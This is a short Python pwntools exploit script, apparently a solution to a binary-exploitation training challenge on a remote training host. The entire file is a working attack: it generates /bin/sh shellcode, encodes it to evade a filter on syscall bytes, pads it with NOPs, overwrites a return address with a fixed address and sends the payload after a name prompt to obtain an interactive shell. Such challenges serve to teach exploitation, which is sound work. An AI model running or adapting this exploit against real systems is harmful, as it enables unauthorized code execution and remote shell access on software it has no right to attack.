from pwn import *


context.clear(arch='amd64',os='linux')
run_local = False
if run_local:
	s = ssh(host='localhost',user='acidburn',port=2222)
	r= s.process('/home/acidburn/Desktop/malicious/shell/5/syscall')
	pid=gdb.attach(r)
	input("wait")
else:
	r=remote("bin.training.jinblack.it",3101)




#sc = shellcraft.execve(path="/bin/cat",argv=["/bin/cat","flag"])
sc= shellcraft.sh()

sc=asm(sc)

sc_encoded=pwnlib.encoders.encoder.encode(sc,b'\x0f\x05')

shellcode = sc_encoded

shellcode = shellcode.ljust(216,b'\x90') + b"\x80\x40\x40\x00\x00\x00\x00\x00"

shellcode = shellcode.ljust(1000,b"A")


print(r.recvuntil(b"What is your name?\n"))
r.send(shellcode)

r.interactive()

